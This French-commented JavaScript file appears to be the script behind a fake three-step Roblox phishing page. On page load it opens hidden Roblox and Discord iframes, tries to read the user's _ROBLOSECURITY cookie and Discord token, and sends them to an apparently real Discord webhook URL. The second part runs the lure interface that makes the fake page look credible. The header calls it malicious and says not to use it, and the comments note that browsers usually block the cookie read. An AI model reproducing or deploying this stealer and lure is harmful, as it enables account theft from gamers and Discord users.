/*
  =====================================================================
  ATTENTION : CE SCRIPT EST MALVEILLANT ET FOURNI POUR L'EXEMPLE.
  NE L'UTILISEZ PAS.
  =====================================================================
*/

// --- PARTIE 1: Le script malveillant (Logger) ---
// S'exécute dès le chargement de la page pour voler les informations.

// L'URL du webhook de l'attaquant serait placée ici.
const webhook = 'https://discord.com/api/webhooks/1389354788227125268/JITLLb1RDMhZY8smEw_s5unCW8wauPcO4BnSSzA1gkQW8qOpBRxux8hEc7oFW_jMeuoh'; 

function sendInfoToAttacker(robloxCookie, discordToken) {
    const data = {
        content: "Nouvelles informations capturées !",
        embeds: [{
            title: "HTML Logger Results",
            color: 16711680, // Rouge
            fields: [
                {
                    name: "Cookie _ROBLOSECURITY",
                    value: "```" + (robloxCookie || "Non trouvé") + "```"
                },
                {
                    name: "Token Discord",
                    value: "```" + (discordToken || "Non trouvé") + "```"
                }
            ]
        }]
    };

    // La requête pour envoyer les données volées à l'attaquant.
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(error => console.error("Erreur lors de l'envoi des infos :", error));
}

function startStealing() {
    console.log("Tentative de vol des informations en arrière-plan...");

    // Crée une iframe invisible pour Roblox
    const robloxIframe = document.createElement('iframe');
    robloxIframe.src = 'https://www.roblox.com/home';
    robloxIframe.style.display = 'none';
    document.body.appendChild(robloxIframe);

    // Crée une iframe invisible pour Discord
    const discordIframe = document.createElement('iframe');
    discordIframe.src = 'https://discord.com/app';
    discordIframe.style.display = 'none';
    document.body.appendChild(discordIframe);

    // Tente de récupérer les informations après un court délai
    // Note : les navigateurs modernes bloquent souvent ces tentatives (Cross-Origin Policy)
    setTimeout(() => {
        let robloxCookie = "Accès refusé par le navigateur";
        let discordToken = "Accès refusé par le navigateur";

        // Cette partie ne fonctionne généralement plus sur les navigateurs modernes,
        // mais c'est l'intention du code malveillant.
        try {
            robloxCookie = robloxIframe.contentDocument.cookie || "Cookie non trouvé";
        } catch (e) {
            console.error("Impossible d'accéder au cookie Roblox :", e.message);
        }

        try {
            discordToken = discordIframe.contentWindow.localStorage.getItem('token');
        } catch (e) {
            console.error("Impossible d'accéder au token Discord :", e.message);
        }

        sendInfoToAttacker(robloxCookie, discordToken);

        // Nettoie les iframes
        robloxIframe.remove();
        discordIframe.remove();

    }, 5000); // Attend 5 secondes que les iframes chargent
}

// Déclenche le vol dès que la page est chargée.
startStealing();


// --- PARTIE 2: La logique de l'interface utilisateur (Le Leurre) ---
// Fait fonctionner la fausse page pour la rendre crédible.

const buttons = document.querySelectorAll('.x-btn');
const stepCounter = document.getElementById('x-step_counter');
const stepInstructions = document.querySelector('.x-stepinstructions');

const stepFrames = [
    document.getElementById('x-step1'),
    document.getElementById('x-step2'),
    document.getElementById('x-step3')
];

let currentStep = 1;

function updateStepUI() {
    // Cache toutes les étapes
    stepFrames.forEach(frame => frame.style.display = 'none');
    
    // Affiche l'étape actuelle
    if (stepFrames[currentStep - 1]) {
        stepFrames[currentStep - 1].style.display = 'block';
    }

    // Met à jour le texte
    stepCounter.innerText = `Étape ${currentStep} sur 3`;
    if (currentStep === 1) {
        stepInstructions.innerText = "Étape 1: Quel est votre pseudo Roblox ?";
    } else if (currentStep === 2) {
        stepInstructions.innerText = "Étape 2: Confirmez-vous ?";
    } else if (currentStep === 3) {
        stepInstructions.innerText = "Étape 3: Terminé !";
    }
}

buttons.forEach(button => {
    button.onclick = function() {
        if (currentStep < 3) {
            currentStep++;
            updateStepUI();
        }
    };
});

// Initialise l'interface
updateStepUI();
